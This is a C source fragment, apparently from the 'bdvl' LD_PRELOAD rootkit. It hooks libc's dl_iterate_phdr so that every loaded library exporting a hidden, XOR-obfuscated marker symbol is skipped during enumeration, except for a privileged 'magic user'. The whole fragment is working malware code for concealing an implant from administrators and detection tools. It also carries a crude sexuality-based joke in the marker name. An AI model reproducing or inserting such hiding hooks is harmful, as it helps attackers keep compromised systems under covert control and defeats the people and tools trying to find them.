/* this is actually libc but being in here feels suitable. */

static int (*ocallback)(struct dl_phdr_info *info, size_t size, void *data) = NULL;

/* if we can resolve 'bdvlsuperreallygay' in the target object, then it's probably bdvl... */
int __attribute((visibility("hidden"))) magiccallback(struct dl_phdr_info *info, size_t size, void *data){
    const char *subject = info->dlpi_name;
    char *fname;
    void *handle, *fn;

    if(!strlen(subject))
        return ocallback(info, size, data);
    else if((handle = dlopen(subject, RTLD_LAZY)) == NULL)
        return ocallback(info, size, data);

    locate_dlsym();
    fname = xordup(RLLYGAY);
    fn = o_dlsym(handle, fname);
    clean(fname);
    dlclose(handle);

    if(fn != NULL)
        return 0;
    return ocallback(info, size, data);
}

int dl_iterate_phdr(int (*callback)(struct dl_phdr_info *info, size_t size, void *data), void *data){
    ocallback = callback;
    hook(CDL_ITERATE_PHDR);
    if(magicusr()) return (long)call(CDL_ITERATE_PHDR, callback, data);
    return (long)call(CDL_ITERATE_PHDR, magiccallback, data);
}